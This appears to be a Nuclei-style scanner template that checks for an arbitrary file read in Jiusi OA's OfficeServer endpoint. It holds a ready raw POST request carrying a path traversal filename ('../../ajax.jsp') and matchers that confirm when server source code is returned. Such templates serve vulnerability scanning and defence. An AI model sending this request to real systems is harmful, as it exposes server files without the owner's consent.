id: jiusi-oa-fileread-OfficeServer_isAjaxDownloadTemplate

info:
  name: jiusi-oa-fileread-OfficeServer_isAjaxDownloadTemplate
  author: YY
  severity: high

variables:
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /jsoa/OfficeServer?isAjaxDownloadTemplate=false HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 
        Content-Type: multipart/form-data; boundary=------------------------{{boundary}}
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Length: 257
        Connection: close

        --------------------------{{boundary}}
        Content-Disposition: form-data; name="test"

        {"OPTION":"LOADFILE","viewDocHistory":"1","FILENAME":"../../ajax.jsp"}
        --------------------------{{boundary}}--

    matchers-condition: and
    matchers:
      - type: dsl
        condition: and
        dsl:
          - contains_all(body, "request.getAttribute",'language=\"java\"')
          - contains_all(header, "attachment;filename","x-msdownload")